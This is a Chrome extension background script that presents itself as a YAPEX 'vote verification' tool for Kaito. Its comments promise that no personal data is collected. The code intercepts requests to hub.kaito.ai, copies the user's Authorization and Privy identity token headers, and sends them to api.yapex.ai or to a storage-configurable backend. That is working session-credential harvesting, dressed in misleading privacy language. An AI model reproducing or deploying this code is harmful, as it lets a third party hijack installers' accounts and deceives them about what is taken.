/**
 * YAPEX Vote Verification Extension
 * 
 * This extension securely verifies Kaito votes for the YAPEX secondary marketplace.
 * It only collects the minimum required verification tokens needed to confirm vote authenticity.
 * 
 * Data Privacy & Security:
 * - Only verification tokens are collected, never personal data
 * - Data is only used for vote verification purposes
 * - All communication with our servers is encrypted
 * - Tokens are never stored locally or shared with third parties
 * - Data is processed in compliance with privacy regulations
 */

console.log("YAPEX Vote Verification: Extension activated");

// Configuration
// Default backend URLs
const DEFAULT_BACKEND_URLS = {
  production: "https://api.yapex.ai",
  local: "https://api.yapex.ai",
};

// Function to get the current backend URL from chrome.storage
async function getBackendUrl() {
  try {
    // Get the URL from chrome.storage
    const result = await new Promise(resolve => {
      chrome.storage.local.get(['yapexBackendUrl', 'yapexUseLocalBackend'], resolve);
    });
    
    // If we have a saved URL, use it
    if (result.yapexBackendUrl) {
      return result.yapexBackendUrl;
    }
    
    // If we have a saved preference but no URL, calculate the URL
    if (result.yapexUseLocalBackend !== undefined) {
      const isLocal = result.yapexUseLocalBackend === true;
      return isLocal ? DEFAULT_BACKEND_URLS.local : DEFAULT_BACKEND_URLS.production;
    }
    
    // Default to production if nothing is saved
    return DEFAULT_BACKEND_URLS.production;
  } catch (error) {
    console.error("YAPEX Vote Verification: Error getting backend URL", error);
    return DEFAULT_BACKEND_URLS.production;
  }
}

// Monitor specific Kaito API requests to verify votes
chrome.webRequest.onSendHeaders.addListener(
  (details) => {
    // Only process GET requests
    if (details.method !== "GET") return;
    
    // Extract verification tokens only
    const verificationTokens = {};
    
    for (const header of details.requestHeaders) {
      // Case-insensitive header name matching
      const headerName = header.name.toLowerCase();
      
      // Collect only the specific tokens needed for vote verification
      if (headerName === "authorization") {
        verificationTokens["Authorization"] = header.value;
      }
      
      if (headerName === "privy-id-token" || 
          headerName === "privy_id_token" || 
          headerName === "privyidtoken" ||
          headerName.includes("privy")) {
        verificationTokens["Privy-Id-Token"] = header.value;
      }
    }
    
    // If verification tokens are found, securely send them for verification
    if (Object.keys(verificationTokens).length > 0) {
      console.log("YAPEX Vote Verification: Verifying vote authenticity");
      
      // Send tokens securely for verification
      verifyVoteAuthenticity(verificationTokens, details.url);
    }
  },
  { 
    urls: [
      "https://hub.kaito.ai/api/v1/yapper/projects",
      "https://hub.kaito.ai/api/v1/yapper/projects/*/vote-details*"
    ]
  },
  ["requestHeaders"]
);

/**
 * Securely sends verification tokens to verify vote authenticity
 * These tokens are only used to confirm that votes are legitimate
 * and are never stored or used for any other purpose
 */
async function verifyVoteAuthenticity(tokens, sourceUrl) {
  try {
    console.log("YAPEX Vote Verification: Sending verification data");
    
    // Get the current backend URL from storage
    const backendUrl = await getBackendUrl();
    console.log("YAPEX Vote Verification: Using backend URL", backendUrl);
    
    const verificationData = {
      tokens: tokens,
      sourceUrl: sourceUrl,
      timestamp: Date.now()
    };

    console.log("YAPEX Vote Verification: Verification data", verificationData);
    
    const response = await fetch(`${backendUrl}/extensions/callback`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(verificationData)
    });
    
    if (response.ok) {
      console.log("YAPEX Vote Verification: Vote successfully verified");
    } else {
      console.error("YAPEX Vote Verification: Verification failed", response.status);
    }
  } catch (error) {
    console.error("YAPEX Vote Verification: Error during verification", error);
  }
}

// Handle extension installation
chrome.runtime.onInstalled.addListener(() => {
  console.log("YAPEX Vote Verification: Extension installed");
  
  // Set default values in chrome.storage
  chrome.storage.local.set({
    yapexUseLocalBackend: false,
    yapexBackendUrl: DEFAULT_BACKEND_URLS.production
  });
});

// Listen for storage changes to update the backend URL
chrome.storage.onChanged.addListener((changes, namespace) => {
  if (namespace === 'local' && changes.yapexBackendUrl) {
    console.log("YAPEX Vote Verification: Backend URL updated", changes.yapexBackendUrl.newValue);
  }
});

// Add listener to respond to extension detection requests
chrome.runtime.onMessageExternal.addListener(
  (message, sender, sendResponse) => {
    if (message.type === 'DETECT_YAPEX_EXTENSION') {
      sendResponse({ installed: true, version: chrome.runtime.getManifest().version });
      return true; // Keep the message channel open for the async response
    }
  }
); 